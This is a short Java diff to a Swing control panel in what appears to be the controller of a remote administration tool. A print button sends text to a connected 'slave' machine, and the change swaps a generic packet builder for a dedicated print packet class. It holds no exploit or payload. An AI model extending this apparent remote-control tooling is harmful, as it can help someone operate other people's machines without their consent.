@@ -13,8 +13,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet69Print;
 
 @SuppressWarnings("serial")
 public class PanelControlPrinter extends PanelControlParent {
@@ -30,7 +29,7 @@ public class PanelControlPrinter extends PanelControlParent {
 		btnPrint.setIcon(new ImageIcon(PanelControlPrinter.class.getResource("/icons/printer.png")));
 		btnPrint.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				slave.addToSendQueue(new PacketBuilder(OutgoingHeader.PRINT, textPane.getText()));
+				slave.addToSendQueue(new Packet69Print(textPane.getText()));
 			}
 		});
 		
